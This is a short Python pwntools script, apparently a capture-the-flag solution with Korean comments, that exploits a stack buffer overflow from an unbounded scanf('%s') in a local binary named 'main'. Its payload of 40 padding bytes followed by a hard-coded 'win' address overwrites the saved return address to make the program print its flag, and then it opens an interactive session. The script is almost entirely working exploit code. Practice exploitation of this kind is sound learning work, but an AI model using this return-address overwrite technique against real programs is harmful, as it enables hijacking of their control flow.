from pwn import *

p=process('./main')


#Goal
#win 함수에서 flag를 출력시키는 것을 발견
#해당 함수를 호출하는 것이 목표

#Vulnerability
#scanf("%s", buf) 로 입력을 받기 때문에 길이 제한이 없어 버퍼 오버플로우 발생

#Exploitation

win = 0x0000000000401176

payload=b'A'*0x20  + b'B'*8
payload += p64(win)
p.sendline(payload)

p.interactive()
